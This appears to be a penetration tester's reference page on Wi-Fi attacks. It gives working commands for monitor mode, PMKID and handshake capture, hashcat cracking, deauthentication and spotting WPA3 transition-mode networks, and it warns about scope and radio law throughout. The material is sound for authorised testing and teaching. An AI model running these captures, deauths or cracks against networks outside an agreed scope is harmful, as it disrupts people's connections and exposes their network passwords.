+++
title = "wireless"
description = "802.11 recon, capture and cracking — interface setup through to hashcat."
weight = 3
+++

Wireless work is half radio and half patience. The kit matters: you need a chipset that supports monitor mode (and injection, for some attacks), and you need to be on the right channel at the right time. Everything here assumes networks that are in scope — radio doesn't respect scope boundaries, so filter to your targets.

## interface setup

### airmon-ng
Puts an interface into monitor mode, after stopping processes that would fight you for it.

```sh
sudo airmon-ng check kill
sudo airmon-ng start <iface>
```

```sh
# put things back afterwards
sudo airmon-ng stop <iface>mon
sudo systemctl restart NetworkManager
```

### iw
The manual way — useful when airmon-ng renames things unhelpfully.

```sh
sudo ip link set <iface> down
sudo iw dev <iface> set type monitor
sudo ip link set <iface> up
iw dev <iface> info
```

```sh
# confirm injection actually works
sudo aireplay-ng --test <mon-iface>
```

> **trap**
>
> - `check kill` stops NetworkManager and wpa_supplicant — your normal Wi-Fi goes with them. Use a second adapter for monitor mode if you need to stay online.
> - "Monitor mode enabled" doesn't mean injection works. Test it before you rely on it.
> - Check the regulatory domain (`iw reg get`) — it controls which channels and power levels you're allowed to use.

## recon

### airodump-ng
Lists access points and clients, with encryption, cipher and auth type per network.

```sh
# all bands
sudo airodump-ng <mon-iface> --band abg
```

```sh
# lock onto one network to capture
sudo airodump-ng <mon-iface> -c <channel> --bssid <bssid> -w capture
```

> **trap**
>
> By default airodump-ng only hops 2.4 GHz — add `--band abg` or you'll miss every 5 GHz network. And once you're capturing, lock the channel (`-c`): hopping means you miss most of the frames you're waiting for.

## pmkid and handshakes

### hcxdumptool
Captures PMKIDs and EAPOL handshakes. It handles monitor mode itself — don't run airmon-ng first.

```sh
# build a filter so you only interact with in-scope APs
sudo hcxdumptool --bpfc="wlan addr3 <bssid-no-colons>" > scope.bpf
```

```sh
# channel + band suffix: a = 2.4 GHz (6a), b = 5 GHz (36b)
sudo hcxdumptool -i <iface> -w dump.pcapng -c <channel><band> --bpf=scope.bpf --rds=1
```

### hcxpcapngtool
Converts the capture into hashcat's format.

```sh
hcxpcapngtool -o hash.hc22000 dump.pcapng
```

```sh
hashcat -m 22000 hash.hc22000 <wordlist>
```

> **trap**
>
> - hcxdumptool is **active** — by default it talks to access points and clients near you. Without a BPF filter that means networks that aren't yours. Always filter to the target.
> - Its options changed a lot in version 6.3 — older guides use flags (`-o`, `--enable_status`) that no longer exist. Check `hcxdumptool -h` for your version.
> - Modes `2500` and `16800` are deprecated. Use `22000` for both PMKIDs and handshakes.

## deauthentication

### aireplay-ng
Forces a client to disconnect so you can capture the handshake when it reconnects.

```sh
sudo aireplay-ng -0 3 -a <bssid> -c <client-mac> <mon-iface>
```

> **trap**
>
> Deauth is disruptive by design — it knocks real people offline — and it counts as interference under radio law (in the UK, the Wireless Telegraphy Act). It needs to be explicitly in scope, not just "wireless is in scope". It also won't work against clients using Protected Management Frames (802.11w), which is mandatory for WPA3.

## wpa3 and transition mode

WPA3-Personal replaces the PSK handshake with SAE, which resists offline dictionary attacks. **Transition mode** runs WPA2-PSK and WPA3-SAE on the same SSID so older devices can still join — and that coexistence is where the weaknesses are, because clients can be steered towards the WPA2 side.

```sh
# airodump-ng's AUTH column shows "SAE PSK" for transition-mode networks
sudo airodump-ng <mon-iface> --band abg
```

```sh
# in Wireshark: beacons advertising SAE (AKM 8) and PSK (AKM 2)
wlan.rsn.akms.type == 8 && wlan.rsn.akms.type == 2
```

> **trap**
>
> A network advertising SAE isn't automatically safe — check whether it also advertises PSK, and whether PMF is *required* or only *capable*. Those two settings decide whether downgrade and deauth tricks apply.

## wireshark filters

```sh
# handshakes
eapol
```

```sh
# beacons / probe requests / deauths
wlan.fc.type_subtype == 0x08
wlan.fc.type_subtype == 0x04
wlan.fc.type_subtype == 0x0c
```
